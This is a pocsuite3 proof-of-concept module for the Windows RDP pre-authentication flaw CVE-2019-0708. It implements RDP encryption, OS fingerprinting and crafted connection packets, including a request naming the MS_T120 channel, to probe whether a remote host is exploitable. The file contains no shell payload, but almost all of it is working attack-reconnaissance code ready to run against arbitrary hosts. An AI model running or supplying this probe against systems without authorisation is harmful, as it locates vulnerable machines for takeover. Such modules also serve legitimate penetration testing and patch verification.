#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# @Time    : 2019/05/22 16:00
# @Author  : fenix

import socket
import struct
import binascii
import hashlib
import random
import base64
from pocsuite3.api import Output, POCBase, register_poc


class RC4:
    """
    This class implements the RC4 streaming cipher.
    Derived from http://cypherpunks.venona.com/archive/1994/09/msg00304.html
    """

    def __init__(self, key, streaming=True):
        assert(isinstance(key, (bytes, bytearray)))

        # key scheduling
        S = list(range(0x100))
        j = 0
        for i in range(0x100):
            j = (S[i] + key[i % len(key)] + j) & 0xff
            S[i], S[j] = S[j], S[i]
        self.S = S

        # in streaming mode, we retain the keystream state between crypt()
        # invocations
        if streaming:
            self.keystream = self._keystream_generator()
        else:
            self.keystream = None

    def crypt(self, data):
        """
        Encrypts/decrypts data (It's the same thing!)
        """
        assert(isinstance(data, (bytes, bytearray)))
        keystream = self.keystream or self._keystream_generator()
        return bytes([a ^ b for a, b in zip(data, keystream)])

    def _keystream_generator(self):
        """
        Generator that returns the bytes of keystream
        """
        S = self.S.copy()
        x = y = 0
        while True:
            x = (x + 1) & 0xff
            y = (S[x] + y) & 0xff
            S[x], S[y] = S[y], S[x]
            i = (S[x] + S[y]) & 0xff
            yield S[i]


class TestPOC(POCBase):
    vulID = 'CVE-2019-0708'
    version = '1.0'
    vulDate = '2019-05-15'
    createDate = '2020-02-21'
    updateDate = '2020-02-21'
    references = ['https://www.seebug.org/vuldb/ssvid-97954']
    name = 'windows rdp rce (cve-2019-0708)'
    appPowerLink = 'https://www.microsoft.com'
    appName = 'rdp'
    appVersion = 'win7, win2k8, win2k8 r2, win2k3, winxp'
    vulType = 'rce'
    desc = '''
    A remote code execution vulnerability exists in Remote Desktop Services – formerly known as Terminal Services – when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests. This vulnerability is pre-authentication and requires no user interaction. An attacker who successfully exploited this vulnerability could execute arbitrary code on the target system.
    '''

    def _log(self, message):
        pass
        #print(message)

    def _bin_to_hex(self, data):
        return ''.join('%.2x' % i for i in data)

    def _create_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(10)
        s.connect((self.ip, self.port))
        return s

    def _conn_req(self):
        return (
            b"\x03\x00" # TPTK, Version: 3, Reserved: 0
            b"\x00\x2b" # Length
            b"\x26" # X.224 Length
            b"\xe0" # X.224 PDU Type
            b"\x00\x00" # Destination reference
            b"\x00\x00" # Source reference
            b"\x00" # Class
            b"\x43\x6f\x6f\x6b\x69\x65\x3a\x20\x6d\x73\x74\x73\x68\x61\x73\x68\x3d\x75\x73\x65\x72\x30\x0d\x0a" # Token
            b"\x01" # RDP Type
            b"\x00" # Flags
            b"\x08" # Length
            b"\x00\x00\x00\x00\x00" # requestedProtocols, TLS security supported: False, CredSSP supported: False
        )

    def _connect_initial(self):
        return (
            b"\x03\x00\x01\xca\x02\xf0\x80\x7f\x65\x82\x01\xbe\x04\x01"
            b"\x01\x04\x01\x01\x01\x01\xff\x30\x20\x02\x02\x00\x22\x02\x02\x00"
            b"\x02\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00"
            b"\x01\x02\x02\xff\xff\x02\x02\x00\x02\x30\x20\x02\x02\x00\x01\x02"
            b"\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x00\x02"
            b"\x02\x00\x01\x02\x02\x04\x20\x02\x02\x00\x02\x30\x20\x02\x02\xff"
            b"\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x02\x00\x01\x02\x02\x00"
            b"\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x04\x82\x01"
            b"\x4b\x00\x05\x00\x14\x7c\x00\x01\x81\x42\x00\x08\x00\x10\x00\x01"
            b"\xc0\x00\x44\x75\x63\x61\x81\x34\x01\xc0\xd8\x00\x04\x00\x08\x00"
            b"\x20\x03\x58\x02\x01\xca\x03\xaa\x09\x04\x00\x00\x28\x0a\x00\x00"
            b"\x78\x00\x31\x00\x38\x00\x31\x00\x30\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00"
            b"\x00\x00\x00\x00\x18\x00\x07\x00\x01\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x04\xc0\x0c\x00\x09\x00\x00\x00\x00\x00\x00\x00\x02\xc0\x0c\x00"
            b"\x03\x00\x00\x00\x00\x00\x00\x00\x03\xc0\x44\x00\x05\x00\x00\x00"
            b"\x63\x6c\x69\x70\x72\x64\x72\x00\xc0\xa0\x00\x00\x4d\x53\x5f\x54"
            b"\x31\x32\x30\x00\x80\x80\x00\x00\x72\x64\x70\x73\x6e\x64\x00\x00"
            b"\xc0\x00\x00\x00\x73\x6e\x64\x64\x62\x67\x00\x00\xc0\x00\x00\x00"
            b"\x72\x64\x70\x64\x72\x00\x00\x00\x80\x80\x00\x00"
        )

    def _erect_domain_req(self):
        return (
            b"\x03\x00\x00\x0c\x02\xf0\x80\x04\x00\x01\x00\x01"
        )

    def _attach_user_req(self):
        return (
            b"\x03" # TPKT Version: 3
            b"\x00" # Reserved: 0
            b"\x00\x08" # Length: 8
            b"\x02\xf0\x80\x28"
        )

    def _channel_join_req(self, initiator, channelId):
        return (
                   b"\x03\x00\x00\x0c\x02\xf0\x80\x38%s%s"
               ) % (initiator, channelId)

    def _security_exchange(self, rcran, rsexp, rsmod, bitlen):
        x = (rcran ** rsexp) % rsmod
        nbytes, rem = divmod(x.bit_length(), 8)
        if rem:
            nbytes += 1
        encrytedClientRandom = x.to_bytes(nbytes, byteorder='little')
        self._log("Encrypted client random: %s" % self._bin_to_hex(encrytedClientRandom))
        bitlen += 8
        userdata_length = 8 + bitlen
        userdata_length_low = userdata_length & 0xFF
        userdata_length_high = userdata_length // 256
        flags = 0x80 | userdata_length_high
        return (
                b"\x03\x00%s" % (userdata_length + 15).to_bytes(2, byteorder='big') + # TPTK
                b"\x02\xf0\x80" # X.224
                b"\x64" # sendDataRequest
                b"\x00\x08" # initiator
                b"\x03\xeb" # channelId
                b"\x70" # dataPriority
                b"%s" % (flags).to_bytes(1, byteorder='big') +
                b"%s" % (userdata_length_low).to_bytes(1, byteorder='big') + # UserData length
                b"\x01\x00" # securityHeader flags
                b"\x00\x00" # securityHeader flagsHi
                b"%s" % (bitlen).to_bytes(4, byteorder='little') + # securityPkt length
                b"%s" % encrytedClientRandom + # 64 bytes encrypted client random
                b"\x00\x00\x00\x00\x00\x00\x00\x00" # 8 bytes rear padding
        )

    def _client_info(self):
        return binascii.unhexlify(
            "000000003301000000000a00000000000000000075007300650072003000000000000000000002001c003100390032002e003100360038002e0031002e0032003000380000003c0043003a005c00570049004e004e0054005c00530079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c000000a40100004700540042002c0020006e006f0072006d0061006c0074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000a00000005000300000000000000000000004700540042002c00200073006f006d006d006100720074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000300000005000200000000000000c4ffffff00000000270000000000"
        )

    def _pdu_client_confirm_active(self):
        return binascii.unhexlify(
            "a4011300f103ea030100ea0306008e014d53545343000e00000001001800010003000002000000000d04000000000000000002001c00100001000100010020035802000001000100000001000000030058000000000000000000000000000000000000000000010014000000010047012a000101010100000000010101010001010000000000010101000001010100000000a1060000000000000084030000000000e40400001300280000000003780000007800000050010000000000000000000000000000000000000000000008000a000100140014000a0008000600000007000c00000000000000000005000c00000000000200020009000800000000000f000800010000000d005800010000000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe000001400000080001000102000000"
        )

    def _pdu_client_persistent_key_list(self):
        return binascii.unhexlify(
            "49031700f103ea03010000013b031c00000001000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        )

    def _try_check(self, rc4enckey, hmackey):
        for i in range(5):
            res = self._rdp_recv()
        for j in range(5):
            self._rdp_send(self._rdp_encrypted_pkt(binascii.unhexlify("100000000300000000000000020000000000000000000000"), rc4enckey, hmackey, b"\x08\x00", b"\x00\x00", b"\x03\xed"))
            self._rdp_send(self._rdp_encrypted_pkt(binascii.unhexlify("20000000030000000000000000000000020000000000000000000000000000000000000000000000"), rc4enckey, hmackey, b"\x08\x00", b"\x00\x00", b"\x03\xed"))
            for i in range(3):
                res = self._rdp_recv()
                if binascii.unhexlify("0300000902f0802180") in res:
                    return True
        return False

    def _rdp_hmac(self, hmackey, data):
        s = hashlib.sha1()
        m = hashlib.md5()
        pad1 = b'\x36' * 40
        pad2 = b'\x5c' * 48
        s.update(hmackey + pad1 + len(data).to_bytes(4, byteorder='little') + data)
        m.update(hmackey + pad2 + s.digest())
        return m.digest()

    def _rdp_rc4_crypt(self, rc4enckey, data):
        return rc4enckey.crypt(data)

    def _rdp_encrypted_pkt(self, data, rc4enckey, hmackey, flags=b"\x08\x00", flagsHi=b"\x00\x00", channelId=b"\x03\xeb"):
        userData_len = len(data) + 12
        udl_with_flag = 0x8000 | userData_len
        pkt = (
                b"\x02\xf0\x80" # X.224
                b"\x64" # sendDataRequest
                b"\x00\x08" # initiator
                b"%s" % channelId + # channelId
                b"\x70" # dataPriority
                b"%s" % (udl_with_flag.to_bytes(2, byteorder='big')) +  # udl_with_flag
                b"%s" % flags + # flags  SEC_INFO_PKT | SEC_ENCRYPT
                b"%s" % flagsHi + # flagsHi
                b"%s" % self._rdp_hmac(hmackey, data)[0:8] + # rdp_hmac
                b"%s" % self._rdp_rc4_crypt(rc4enckey, data) # drp_rc4_encrypt
        )
        tpkt = (
                b"\x03\x00"
                b"%s" % ((len(pkt) + 4).to_bytes(2, byteorder='big')) +
                b"%s" % pkt
        )
        return tpkt

    def _rdp_parse_serverdata(self, pkt):
        ptr = 0
        rdp_pkt = pkt[0x49:]
        while ptr < len(rdp_pkt):
            header_type = rdp_pkt[ptr:ptr+2]
            header_length = int.from_bytes(rdp_pkt[ptr+2:ptr+4], byteorder='little')
            self._log("header type: %s, header length: %d" % (self._bin_to_hex(header_type), header_length))

            if header_type == b'\x02\x0c':
                self._log("security header")
                server_random = rdp_pkt[ptr+20:ptr+52]
                public_exponent = rdp_pkt[ptr+84:ptr+88]
                modulus = rdp_pkt[ptr+88:ptr+152]
                self._log("modulus old: %s" % self._bin_to_hex(modulus))
                self._log("RSA magic: %s" % rdp_pkt[ptr+68:ptr+72].decode())
                bitlen = int.from_bytes(rdp_pkt[ptr+72:ptr+76], byteorder='little') - 8
                self._log("RSA bitlen: %d" % bitlen)
                modulus = rdp_pkt[ptr+88:ptr+88+bitlen]
                self._log("modulus new: %s" % self._bin_to_hex(modulus))
            ptr += header_length

        self._log("SERVER_MODULUS: %s" % self._bin_to_hex(modulus))
        self._log("SERVER_EXPONENT: %s" % self._bin_to_hex(public_exponent))
        self._log("SERVER_RANDOM: %s" % self._bin_to_hex(server_random))
        rsmod = int.from_bytes(modulus, byteorder='little')
        rsexp = int.from_bytes(public_exponent, byteorder='little')
        rsran = int.from_bytes(server_random, byteorder='little')
        self._log("rsmod: %d" % rsmod)
        self._log("rsexp: %d" % rsexp)
        self._log("rsran: %d" % rsran)
        return rsmod, rsexp, rsran, server_random, bitlen

    def _rdp_salted_hash(self, s_bytes, i_bytes, clientRandom_bytes, serverRandom_bytes):
        m = hashlib.md5()
        s = hashlib.sha1()
        s.update(i_bytes + s_bytes + clientRandom_bytes + serverRandom_bytes)
        m.update(s_bytes + s.digest())
        return m.digest()

    def _rdp_final_hash(self, k, clientRandom_bytes, serverRandom_bytes):
        m = hashlib.md5()
        m.update(k + clientRandom_bytes + serverRandom_bytes)
        return m.digest()

    def _rdp_calculate_rc4_keys(self, client_random, server_random):
        preMasterSecret = client_random[0:24] + server_random[0:24]
        masterSecret = self._rdp_salted_hash(preMasterSecret, b"A", client_random, server_random) + self._rdp_salted_hash(preMasterSecret, b"BB", client_random, server_random) + self._rdp_salted_hash(preMasterSecret, b"CCC", client_random, server_random)
        sessionKeyBlob = self._rdp_salted_hash(masterSecret, b"X", client_random, server_random) + self._rdp_salted_hash(masterSecret, b"YY", client_random, server_random) + self._rdp_salted_hash(masterSecret, b"ZZZ", client_random, server_random)
        initialClientDecryptKey128 = self._rdp_final_hash(sessionKeyBlob[16:32], client_random, server_random)
        initialClientEncryptKey128 = self._rdp_final_hash(sessionKeyBlob[32:48], client_random, server_random)
        macKey = sessionKeyBlob[0:16]
        self._log("PreMasterSecret: %s" % self._bin_to_hex(preMasterSecret))
        self._log("MasterSecret: %s" % self._bin_to_hex(masterSecret))
        self._log("sessionKeyBlob: %s" % self._bin_to_hex(sessionKeyBlob))
        self._log("mackey: %s" % self._bin_to_hex(macKey))
        self._log("initialClientDecryptKey128: %s" % self._bin_to_hex(initialClientDecryptKey128))
        self._log("initialClientEncryptKey128: %s" % self._bin_to_hex(initialClientEncryptKey128))
        return initialClientEncryptKey128, initialClientDecryptKey128, macKey, sessionKeyBlob

    def _rdp_send(self, data):
        self._log(self._bin_to_hex(data))
        self.socket.sendall(data)

    def _rdp_recv(self):
        tptk_header = self.socket.recv(4)
        body = self.socket.recv(int.from_bytes(tptk_header[2:4], byteorder='big'))
        return tptk_header + body

    def _rdp_send_recv(self, data):
        self._rdp_send(data)
        return self._rdp_recv()

    def _check_rdp(self):
        try:
            self._rdp_send_recv(self._conn_req())
        except Exception as e:
            print(str(e))
            return False
        return True

    def _check_rdp_vuln(self):
        if not self._check_rdp():
            return False
        # send initial client data
        res = self._rdp_send_recv(self._connect_initial())
        rsmod, rsexp, rsran, server_rand, bitlen = self._rdp_parse_serverdata(res)

        # erect domain and attach user
        self._rdp_send(self._erect_domain_req())
        res = self._rdp_send_recv(self._attach_user_req())
        initiator = res[-2:]

        # send channel requests
        self._rdp_send_recv(self._channel_join_req(initiator, struct.pack('>H', 1009)))
        self._rdp_send_recv(self._channel_join_req(initiator, struct.pack('>H', 1003)))
        self._rdp_send_recv(self._channel_join_req(initiator, struct.pack('>H', 1004)))
        self._rdp_send_recv(self._channel_join_req(initiator, struct.pack('>H', 1005)))
        self._rdp_send_recv(self._channel_join_req(initiator, struct.pack('>H', 1006)))
        self._rdp_send_recv(self._channel_join_req(initiator, struct.pack('>H', 1007)))
        self._rdp_send_recv(self._channel_join_req(initiator, struct.pack('>H', 1008)))

        client_rand = b'\x41' * 32
        rcran = int.from_bytes(client_rand, byteorder='little')
        self._log("Sending security exchange PDU")
        security_exchange_pdu = self._security_exchange(rcran, rsexp, rsmod, bitlen)
        self._log(self._bin_to_hex(security_exchange_pdu))
        self._rdp_send(security_exchange_pdu)

        rc4encstart, rc4decstart, hmackey, sessblob = self._rdp_calculate_rc4_keys(client_rand, server_rand)
        rc4enckey = RC4(rc4encstart)

        self._log("Sending encrypted client info PDU")
        res = self._rdp_send_recv(self._rdp_encrypted_pkt(self._client_info(), rc4enckey, hmackey, b"\x48\x00"))
        self._log("Received License packet: %s" % self._bin_to_hex(res))
        res = self._rdp_recv()
        self._log("Received Server Demand packet: %s" % self._bin_to_hex(res))
        self._log("Sending client confirm active PDU")
        self._rdp_send(self._rdp_encrypted_pkt(self._pdu_client_confirm_active(), rc4enckey, hmackey, b"\x38\x00"))
        self._log("Sending client synchronize PDU")
        self._log("Sending client control cooperate PDU")

        synch = self._rdp_encrypted_pkt(binascii.unhexlify("16001700f103ea030100000108001f0000000100ea03"), rc4enckey, hmackey)
        coop = self._rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000400000000000000"), rc4enckey, hmackey)
        self._log("Grea2t!")
        self._rdp_send(synch)
        self._rdp_send(coop)

        self._log("Sending client control request control PDU")
        self._rdp_send(self._rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00140000000100000000000000"), rc4enckey, hmackey))
        self._log("Sending client persistent key list PDU")
        self._rdp_send(self._rdp_encrypted_pkt(self._pdu_client_persistent_key_list(), rc4enckey, hmackey))
        self._log("Sending client font list PDU")
        self._rdp_send(self._rdp_encrypted_pkt(binascii.unhexlify("1a001700f103ea03010000010c00270000000000000003003200"), rc4enckey, hmackey))

        return self._try_check(rc4enckey, hmackey)

    def _detect_os(self):
        finger = {
            "2000/xp": "0300000b06d00000123400",
            "2003": "030000130ed000001234000300080002000000",
            "2008": "030000130ed000001234000200080002000000",
            "win7/2008R2": "030000130ed000001234000209080002000000",
            "2008R2DC": "030000130ed000001234000201080002000000",
            "2012R2/8": "030000130ed00000123400020f080002000000"
        }
        new_finger = dict(zip(finger.values(), finger.keys()))
        s = self._create_socket()
        s.send(b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00")
        res = binascii.hexlify(s.recv(2048)).decode()
        s.close()
        if res in new_finger.keys():
            return new_finger[res]
        return ''

    def _verify(self):
        result = {}
        self.ip, self.port = (self.url.split('://')[-1].split('/')[0].split(':') + [3389])[0:2]
        self.port = int(self.port)
        try:
            os = self._detect_os()
        except Exception as e:
            os = 'unknown'
            print(str(e))
        self.socket = self._create_socket()
        if self._check_rdp_vuln():
            result['VerifyInfo'] = {}
            result['VerifyInfo']['POSSIBLE OS'] = os
            result['VerifyInfo']['VULNERABLE TARGET'] = '%s:%d' % (self.ip, self.port)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)